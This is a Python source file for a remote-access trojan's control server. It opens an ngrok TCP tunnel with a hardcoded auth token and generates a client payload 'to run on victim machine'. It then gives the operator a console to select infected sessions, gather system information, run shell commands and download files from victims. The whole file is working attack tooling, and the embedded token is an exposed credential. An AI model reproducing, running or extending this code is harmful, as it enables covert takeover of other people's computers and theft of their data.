import time
import socket
import logging
from tabulate import tabulate
from colorama import *
from threading import Thread
import os
import argparse
from pyngrok import ngrok
import json
import base64

connections = []
addresses = []

class Parser():
    def __init__(self, prs: argparse.Namespace) -> None:
        """
        Checks the User's arguements for any discrepancies

        Args:
            prs (namespace): The user's arguements
        """
        logging.info(f"[Sys]: Verifying User Arguements")
        self.port = prs.port
        self.output = prs.output
        self.cPort()
        self.cOutput()
        logging.info("[Sys]: Verified User Arguements")

    def cPort(self) -> None:
        """
        Function to Check whether the port is valid
        """
        if not self.port:
            print(f"{Fore.RED}[-] Please enter a Port Number{Style.RESET_ALL}")
            logging.error("[Sys]: User didn't enter port number")
            quit()

        if self.port <= 0 or self.port > 65535:
            print(f"{Fore.RED}[-] Please enter a valid Port Number{Style.RESET_ALL}")
            logging.error(f"[Sys]: User's Port Number out of Range ({self.port})")
            quit()

    def cOutput(self) -> None:
        """
        Function to check the output arguemnts
        """
        if self.output:
            if os.path.isdir(os.path.dirname(self.output)):
                pass
            else:
                print(f"{Fore.RED}[-] Directory Doesn't Exit{Style.RESET_ALL}")
                logging.error(f"[Sys]: Output Directory Doesn't Exist ({self.output})")
                exit()

        else:
            print(f"{Fore.RED}[-] Please enter a path for the payload file{Style.RESET_ALL}")
            logging.error(f"User didn't enter output path")
            exit()

class Server():
    def __init__(self) -> None:
        """
        Set the Ngrok Auth Tokens for Servers

        Args:
            prs (namespace): The arguements from the user
        """
        logging.info(f"[Sys]: Setting ngrok server up")
        self.authToken = "23z3ADTPaC5FEE7MyexvIY1XjOk_hySQosBUEnWpakBdyFjg"
        ngrok.set_auth_token(self.authToken)
        logging.info(f"[Sys]: Finished Setting up ngrok server")

    def start(self, prs: argparse.Namespace) -> socket.socket:
        """
        Start the Server

        Args:
            prs (namespace): The User's parsed arguements

        Returns:
            addr: The Address for the Ngrok Server
            port: The Port Number for the Ngrok Server
            socket.socket: The Socket Connection
        """
        logging.info("[Sys]: Starting Server")
        # Create a TCP Socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        logging.info("[Sys]: Created TCP Socket")

        # Bind Socket to Local Port
        serverAddress = ("", prs.port)
        self.sock.bind(serverAddress)
        self.sock.listen(1)
        logging.info("[Sys]: Binded Socket to Port")

        # Create ngrok server
        logging.info("[Sys]: Creating ngrok server")
        publicUrl = ngrok.connect(prs.port, "tcp").public_url
        print(f"[+] Ngrok Server Started from {Style.RESET_ALL}{publicUrl} --> tcp://127.0.0.1:{prs.port}")
        logging.info(f"[Sys]: Created Ngrok Server at {publicUrl}")
        addr = publicUrl.split("tcp://")[1].split(":")[0]
        port = publicUrl.split("tcp://")[1].split(":")[1]
        return addr, port, self.sock

class PayloadGenerator():
    def __init__(self, port: int, addr: str, prs: argparse.Namespace) -> None:
        """
        Creates a payload to run on victim machine

        Args:
            port (int): The port of the NGROK server
            addr (str): The URL for the NGROK server
            prs (namespace): The arguemnts from the user (Mainly for the output path)
        """
        # Run the Generator
        logging.info("Running the Generator")
        self.getVariables(port, addr)
        self.generate(prs)

    def getVariables(self, port: int, addr: str) -> None:
        """
        Create a string with addr and port values for the payload

        Args:
            port (int): The port of the ngrok server
            addr (str): The address of the ngrok server
        """
        # Create a global variable to call in generator function
        self.variables = f"host = '{addr}'\nport = {port}\n\n"

    def getFile(self, fileName: str) -> str:
        """
        Get Files from the Modules Folder to Create the Payload

        Args:
            fileName (str): The file to open from Modules Folder

        Returns:
            str: The file contents
        """
        # Find the file path
        dirname = os.path.dirname(__file__)

        # Add /Moduels to Path
        dirname = os.path.join(dirname, 'Modules')

        # Add the Filename to path
        filePath = os.path.join(dirname, fileName)
        
        # Get the File Contents and Return
        file = open(filePath)
        data = file.read()
        file.close()
        return data
        
    def generate(self, prs: argparse.Namespace) -> None:
        """
        Create the Payload File and Save it to the Path defined in user arguements

        Args:
            prs (namespace): The arguements from the user
        """

        # Check if the output eends with .py (if not then add it)
        if not prs.output.endswith(".py"):
            prs.output = (prs.output + ".py")

        # Create the file
        file = open(prs.output, 'w')

        # Combine the variables to the file contents
        file.write(self.variables)
        file.write(self.getFile('client.py'))
        file.close()
        logging.info(f"Created Payload at {prs.output}")

        # Let User Know the file is generated there
        print(f"[+] Payload Successfully Generated")
        print(f"    {Fore.CYAN}File Located in {prs.output}{Style.RESET_ALL}")

class ClientHandler():
    def __init__(self, sock: socket.socket) -> None:
        """
        Handles the Connections with the Clients

        Args:
            sock (socket.socket): The Socket Connection (From Server Class)
        """
        logging.info(f"[Sys]: Started Client Handler")
        self.sock = sock
        
    def acceptConnections(self) -> None:
        """
        Function to allow connections
        """
        logging.info("[Sys]: Created Thread for Client Handler")
        while True:
            try:
                # Accept Connections
                conn, addr = self.sock.accept()
                self.sock.setblocking(1)

                # Add the Connections to list to connect to
                connections.append(conn)
                addresses.append(addr)

                # Let the User know
                logging.info(f"[Sys]: New Connection")
                print(f"New Connection Established")

            except KeyboardInterrupt:
                print("Closing Server...")
                self.sock.close()
                quit()
            
            except:
                print("Error Accepting Connections")

class HelpCenter():
    def selectHelp(self) -> str:
        """
        Handles the overall help menu when selecting a session

        Returns:
            str: The String to print for the help menu
        """

        return f"Commands:\n    -{Fore.BLUE}help{Style.RESET_ALL}: Show this menu\n    -{Fore.BLUE}list{Style.RESET_ALL}: Show a list of active sessions\n    -{Fore.BLUE}select {Fore.RED}[ID]{Style.RESET_ALL}: Select a session to interact with\n"

    def sessionHelp(self) -> str:
        """
        Handles the overall help menu when in session
        
        Returns:
            str: the help content
        """
        
        return f"Modules:\n     - {Fore.BLUE}help{Style.RESET_ALL}: Shows commands for each module\n     - {Fore.BLUE}shell{Style.RESET_ALL}: Opens a shell on the victim machine\n     - {Fore.BLUE}exit{Style.RESET_ALL}: Exits the session\n"

    def shellModuleHelp(self) -> str:
        return f"Shell Module Help Menu:\n     - {Fore.BLUE}help{Style.RESET_ALL}: Shows this help menu\n     - {Fore.BLUE}download{Style.RESET_ALL}: Download files from victim machine\n     - {Fore.BLUE}exit{Style.RESET_ALL}: Exits the shell\n"

class Commands():
    def sysinfo(self, data: bytes) -> None:
        """
        Handles present the user sysinfo from victim machine

        Args:
            data (bytes): The JSON byte data from the victim machine
        """
        # Decode the Data and Check whether it got a proper response
        if data.decode() == 'Error Getting Sysinfo':
            print("Error Occurred Getting Sysinfo")
        else:
            # Decode the Data
            data = json.loads(data.decode())
            keys = list(data.keys())
            values = list(data.values())
    
            # Iterate and Show User the Response
            for key, val in zip(keys, values):
                print(f"{Fore.BLUE}{key}:{Style.RESET_ALL} {val}")
    
    class Shell():
        def run(self, command: str) -> str:
            """
            Returns the command, used for organization

            Args:
                command (str): The command

            Returns:
                str: The command
            """
            return command

        def download(self, filename: str, conn: socket.socket) -> None:
            """
            Function to Download File from Victim Machine

            Args:
                filename (str): The Filename to save the file as
                conn (socket.socket): The Connection to allow the reciever to connect to
            """
            # Add the Directory
            dirname = os.path.dirname(__file__)
            dirname = os.path.join(dirname, 'Downloads')
            os.makedirs(dirname, exist_ok = True)

            # Save the File
            with open(os.path.join(dirname, filename[9:]), 'wb') as file:
                print("Downloading File...")
                # Get File Data
                data = conn.recv(1024)
                conn.settimeout(1)

                # Write the Data to the File
                counter = 0
                count = 0
                while data:
                    try:
                        if count == 0:
                            file.write(data)
                        count = 0
                        data = conn.recv(1024)
                    except socket.timeout as e:
                        counter += 1
                        count += 1
                        if counter > 1:
                            break

                # Reset the File
                conn.settimeout(None)
                file.close()
        
class CommandCenter(Commands, HelpCenter):
    def __init__(self, sock: socket.socket) -> None:
        """
        Handles all the Commands

        Args:
            sock (socket.socket): The Socket Connections
        """
        self.sock = sock
        self.cli = f"{Fore.GREEN}>> {Style.RESET_ALL}"
        self.conn = None
        self.targetSet = False

    def command(self) -> None:
        """
        The Command Line for Commands
        """
        logging.info("Started CLI")

        # Start the CLI
        while True:
            # Ask the User for Input
            command = input(self.cli)
            logging.info(f"[User]: {command}")

            # Commands
            if self.targetSet:
                if command == 'sysinfo':
                    self.conn.send(str.encode('sysinfo'))
                    self.sysinfo(self.conn.recv(20480))
                elif command == 'exit':
                    self.conn = None
                    self.targetSet = False
                    self.cli = ">> "
                    logging.info("Exitted Session")
                    print("Exitted Session")
                elif command == 'shell':
                    try:
                        self.conn.send(str.encode('shell'))
                        while True:
                            command = input("$ ")
                            if command == 'exit':
                                self.conn.send(str.encode(command))
                                break
                            elif command[:9] == 'download ':
                                self.conn.send(str.encode(command))
                                self.Shell().download(command, self.conn)
                            elif command == 'help':
                                print(self.shellModuleHelp())
                            elif command != "":
                                data = self.Shell().run(command)
                                self.conn.send(str.encode(data))
                                print(self.conn.recv(20480).decode())
                    except BrokenPipeError:
                        print("Connection Disrupted")
                elif command == 'help':
                    print(self.sessionHelp())
                else:
                    try:
                        self.conn.send(str.encode(command))
                    except AttributeError:
                        print(f"Please select a session")
                    
                    except BrokenPipeError:
                        print("\nConnection Disrupted...")
                        print("Please Select a New Target")
                        self.conn = None
                        self.targetSet = False
                        self.cli = f"{Fore.GREEN}>> {Style.RESET_ALL}"
            else:
                if command == 'list':
                    self.listTargets(True)
                elif command[:7] == 'select ':
                    self.listTargets(False)
                    self.conn = self.selectTarget(command)
                elif command == 'help':
                    print(self.selectHelp())
                else:
                    try:
                        self.conn.send(str.encode(command))
                    except AttributeError:
                        print(f"Please select a session")
                    
                    except BrokenPipeError:
                        print("\nConnection Disrupted...")
                        print("Please Select a New Target")
                        logging.warning("Connection Disrupted")
                        self.conn = None
                        self.targetSet = False
                        self.cli = f"{Fore.GREEN}>> {Style.RESET_ALL}"

    def listTargets(self, output: bool = True) -> None:
        """
        Lists out all the active sessions
        """
        # let's Sys check connections
        if output:
            print(f"Active Sessions: ")
            # Check if there are active connections
            if len(connections) > 0:
                # Loop through every connection
                for i, conn in enumerate(connections):
                    # Try to Check whether the connection will return a function
                    try:
                        # Send A Request for Connection Check
                        conn.send(str.encode('connection check'))

                        # Check whether the response exists
                        if conn.recv(20480).decode() == '':
                            # Delete from list if connection doesn't exist
                            del connections[i]
                            del addresses[i]

                        # Print the Connections
                        print(f"Sessions {i} --- {addresses[i]}")
        
                    # If the Connection returns nothing, then remove it
                    except:
                        try:
                            del connections[i]
                            del addresses[i]
                        except Exception as e:
                            logging.error(f"Error Occurred: {e}")
                            pass

                print("\n")

            # If None, let the user know
            else:
                print("Still Waiting for Connections")

        else:
            # Check if there are active connections
            if len(connections) > 0:

                # Loop through every connection
                for i, conn in enumerate(connections):
                    # Try to Check whether the connection will return a function
                    try:
                        conn.send(str.encode('connection check'))
                        if conn.recv(20480).decode() == '':
                            del connections[i]
                            del addresses[i]
        
                    # If the Connection returns nothing, then remove it
                    except:
                        del connections[i]
                        del addresses[i]

    def selectTarget(self, id: str) -> socket.socket:
        """
        Select the Session to Run Commands on

        Args:
            id (str): The ID of the session to use

        Returns:
            socket.socket: The Socket Connection for the Target
        """
        try:
            # Make String into Int
            target = id.replace('select ', '')
            target = int(target)

            # Create the Connection to Target
            conn = connections[target]

            # Change the Terminal Format
            self.cli = f"{Fore.RED}{addresses[target]}{Fore.GREEN} >> {Style.RESET_ALL}"
            self.targetSet = True
            print(f"Target Set to {addresses[target]}\n")

            # Return the Socket
            return conn
        
        except ValueError:
            print("Please Enter a Number Above")

        except IndexError:
            print("Please Select a Valid Target")

def main():
    # ===== PARSER ===== #
    # Create the Arguement Parser
    parser = argparse.ArgumentParser(add_help = False)

    # Set the parser arguements
    parser.add_argument('-p', '--port', dest ="port", default = 0, type = int, help = "Port to Bind to")
    parser.add_argument('-o', '--output', dest = "output", default = "", type = str, help = "Complete Path to Output Payload!")
    parser = parser.parse_args()

    # Check if the arguements are valid
    Parser(parser)

    # ===== Server Creator ===== #
    # Setup the NGROK server
    server = Server()
    serverAddr, serverPort, socket = server.start(parser)

    # ===== Payload Creator ===== #
    PayloadGenerator(serverPort, serverAddr, parser)

    # ===== Start the Client Handler ===== #
    handler = ClientHandler(socket)
    clientHandler = Thread(target = handler.acceptConnections)
    clientHandler.daemon = True
    clientHandler.start()

    # ===== Command Center ===== #
    commandCenter = CommandCenter(socket)
    commandCenter.command()

if __name__ == "__main__":
    logging.basicConfig(filename = 'Logs/main.log', filemode = 'w', level = logging.INFO, format = '%(name)s - %(levelname)s - %(message)s')
    main()